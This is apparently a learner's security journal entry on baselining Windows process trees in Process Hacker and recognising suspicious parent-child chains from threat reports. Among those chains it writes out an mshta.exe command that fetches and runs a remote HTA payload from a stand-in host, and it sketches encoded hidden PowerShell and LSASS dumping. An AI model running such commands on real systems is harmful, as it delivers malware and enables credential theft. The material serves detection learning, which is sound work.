# Day 35 — Process Tree Analysis: Understanding Execution Chains

**Date:** 2026-06-25
**Tool:** Process Hacker 2 (on Windows host)
**Note:** Atomic Red Team simulations skipped — not running attack tools on host machine. Suspicious patterns sourced from published threat intelligence reports instead.

---

## What I Did

Downloaded Process Hacker 2 and opened it on my actual Windows host. The plan was to use the Windows VM but it's still down, and for baselining normal process trees my actual machine works just as well — better actually, because it's a real system with real software running on it, not a clean empty VM.

First impression opening Process Hacker: it's overwhelming. Hundreds of processes listed, most of them with names I didn't recognise. My first instinct was to panic slightly. Then I remembered — the goal today wasn't to understand every process. It was to understand the *relationships* between processes. Which process spawned which. That's the thing that matters for detection.

---

## What Process Trees Actually Are

Before today I kind of understood what a process tree was conceptually. Seeing one live in Process Hacker made it concrete.

Every process on Windows was started by another process. That relationship is the parent-child link. When you open Chrome, Explorer.exe spawns chrome.exe. When Chrome opens a new tab, chrome.exe spawns another chrome.exe. When a script runs, something spawns cmd.exe or powershell.exe.

The reason this matters for detection: attackers can't change what parent process their malware runs under without significant effort. If malware gets executed through a Word macro, the parent is going to be WINWORD.EXE no matter what. That relationship is the tell.

---

## Normal Process Baseline

### What Explorer.exe spawns

Explorer.exe is the Windows desktop shell — the thing that shows your taskbar, your desktop, your file manager. When you open an application normally (double-clicking an icon, clicking a shortcut), it gets spawned by Explorer.exe.

Normal Explorer.exe children I saw:
- `chrome.exe` — opened Chrome from taskbar
- `code.exe` — VS Code opened from desktop shortcut
- `notepad.exe` — opened Notepad from Start menu
- `explorer.exe` — opening a new File Explorer window spawns a child explorer
- `VirtualBox.exe` — opened VirtualBox from desktop

**What would be suspicious:** Explorer.exe spawning `powershell.exe` or `cmd.exe` directly. If you double-click something on your desktop and it runs a PowerShell script instead of opening an application, that's not normal user behaviour — it's a script or malware masquerading as a file.

---

### What svchost.exe looks like

svchost.exe (Service Host) is how Windows runs background services. There are many instances of it running simultaneously — each one hosting one or more Windows services. This confused me at first because I saw maybe 15-20 different svchost.exe processes in Process Hacker.

The key thing: every legitimate svchost.exe should be a child of `services.exe`. If you ever see a svchost.exe whose parent is something other than services.exe — that's a red flag. Malware sometimes names itself svchost.exe specifically because it looks normal in task manager, but the parent process gives it away.

Normal svchost.exe instances I saw:
- Multiple instances all parented to `services.exe`
- Each one hosting different services (you can see which ones in Process Hacker by hovering)
- Examples: Windows Update service, Print Spooler, DHCP client

**What would be suspicious:** `svchost.exe` parented to `explorer.exe`, `cmd.exe`, or any user application. That means something other than the Windows service manager started it.

---

### Chrome's process tree

Chrome uses a multi-process architecture — every tab and extension runs in its own process. This is a security feature (one tab crashing doesn't crash the browser) but it means Chrome looks wild in Process Hacker.

What I saw:
```
chrome.exe (main browser process)
  ├── chrome.exe (GPU process)
  ├── chrome.exe (utility: network service)
  ├── chrome.exe (renderer — one per tab)
  ├── chrome.exe (renderer — one per tab)
  └── chrome.exe (extension process)
```

All children are chrome.exe spawning chrome.exe. Normal.

**What would be suspicious:** Chrome spawning `cmd.exe`, `powershell.exe`, or any executable that isn't part of Chrome. If a malicious website somehow gets Chrome to spawn a shell, that relationship would be visible here immediately.

---

### Normal processes at boot (from research + what I saw)

These are processes that are always running on a Windows machine and should always have predictable parents:

| Process | Normal parent | What it does |
|---------|--------------|--------------|
| `smss.exe` | `System` | Session Manager — first user-mode process |
| `csrss.exe` | `smss.exe` | Client/Server Runtime — handles Windows subsystem |
| `wininit.exe` | `smss.exe` | Initialises Windows services |
| `services.exe` | `wininit.exe` | Service Control Manager — manages all Windows services |
| `lsass.exe` | `wininit.exe` | Local Security Authority — handles authentication |
| `explorer.exe` | `userinit.exe` | Windows shell |
| `svchost.exe` | `services.exe` | Service host — many instances |

If any of these have a different parent than what's listed — that's immediately suspicious and worth investigating.

---

## Suspicious Patterns from Threat Intelligence

For the Hard exercise I couldn't run Atomic Red Team on my host. Instead I pulled suspicious process tree patterns from published threat reports and documented what to look for.

### Pattern 1 — Office App Spawning a Shell (T1566 Phishing via macro)

```
WINWORD.EXE
  └── cmd.exe
        └── powershell.exe -enc [base64 string]
```

Word should never spawn cmd.exe in normal usage. When a user opens a phishing document with a malicious macro, this is exactly what you see. The macro runs, it opens cmd.exe, which runs PowerShell with an encoded command.

**Why encoded?** Base64 encoding hides the actual command from basic string scanning. It's one of the first obfuscation techniques attackers use because it's simple and effective.

---

### Pattern 2 — Living off the Land (T1218 LOLBins)

```
explorer.exe
  └── mshta.exe http://malicious-site.com/payload.hta
```

mshta.exe is a legitimate Windows binary for running HTML applications. Attackers abuse it because it's signed by Microsoft and can download and execute code from a URL. Seeing mshta.exe making a network connection to an external URL is almost always malicious.

---

### Pattern 3 — Scheduled Task for Persistence (T1053.005)

```
svchost.exe (Task Scheduler service)
  └── powershell.exe -windowstyle hidden -enc [payload]
```

Task Scheduler spawning PowerShell with a hidden window and encoded command. The `-windowstyle hidden` flag means the window doesn't appear to the user — the script runs silently in the background. Persistence through scheduled tasks looks exactly like this.

---

### Pattern 4 — Process Masquerading (T1036)

```
explorer.exe
  └── svchost.exe  ← NOT from C:\Windows\System32\svchost.exe
                      Running from C:\Users\labuser\AppData\Temp\svchost.exe
```

Malware naming itself svchost.exe to blend in. The name looks normal in task manager. But the path is wrong — real svchost.exe lives in `C:\Windows\System32\`. Anything named svchost.exe running from anywhere else is malware. Process Hacker shows you the full path, task manager often doesn't.

---

### Pattern 5 — Credential Dumping (T1003 — LSASS access)

```
[any process]
  └── accessing lsass.exe memory with read permissions
```

Not a spawn relationship — this one is about a process opening a handle to lsass.exe. In Process Hacker you can see handles between processes. Any process besides known security tools accessing lsass.exe memory with read permissions is attempting credential dumping.

---

## What I Concluded

Process trees are pattern recognition. You can't identify what's suspicious until you know what's normal. That's why the baselining exercise matters — not because the baseline itself is useful, but because building it forces you to look at process relationships carefully enough that abnormal ones start to jump out.

The thing that surprised me most was how readable process trees are once you know what to look for. It's not that complicated. svchost.exe from the wrong parent is wrong. Office apps spawning shells is wrong. Processes running from Temp directories are wrong. The patterns aren't subtle — they just require knowing what normal looks like first.

---

## Assumption I Made

I assumed you needed to see thousands of process trees before patterns become obvious. After doing this today I think the baseline matters more than volume. If you understand what svchost.exe is supposed to look like, you'll spot a fake one the first time you see it — you don't need to see it a hundred times. The knowledge of what's normal is the skill, not just exposure.

---

## Uncertainty I Have

I still don't know how to handle legitimate software that uses suspicious-looking patterns. Some security tools legitimately access LSASS. Some enterprise software legitimately runs PowerShell from unusual parents. The grey zone between "this looks malicious" and "this is legitimate software behaving weirdly" is where I'll make mistakes as a junior analyst. I don't have enough experience yet to know which exceptions are common and which ones are genuinely rare.